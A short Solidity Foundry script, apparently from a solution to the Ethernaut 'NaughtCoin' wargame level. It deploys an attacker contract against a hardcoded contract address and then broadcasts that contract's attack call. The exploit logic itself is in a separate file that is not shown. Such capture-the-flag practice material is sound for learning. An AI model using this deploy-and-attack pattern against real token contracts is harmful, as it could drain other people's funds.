// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../src/NaughtCoin.sol";
import {NaughtCoinAttacker} from "../src/NaughtCoinAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract NaughtCoinScript is Script {
    NaughtCoin target;
    NaughtCoinAttacker attacker;

    function run() public {
        target = NaughtCoin(0x3f6E87d4B9c95559095FA79b6eEFb3950b345FA5);
        vm.startBroadcast();
        attacker = new NaughtCoinAttacker(address(target));
        vm.stopBroadcast();
    }


    function attack() public {
        vm.startBroadcast();
        attacker.attack();
        vm.stopBroadcast();
    }
    
}
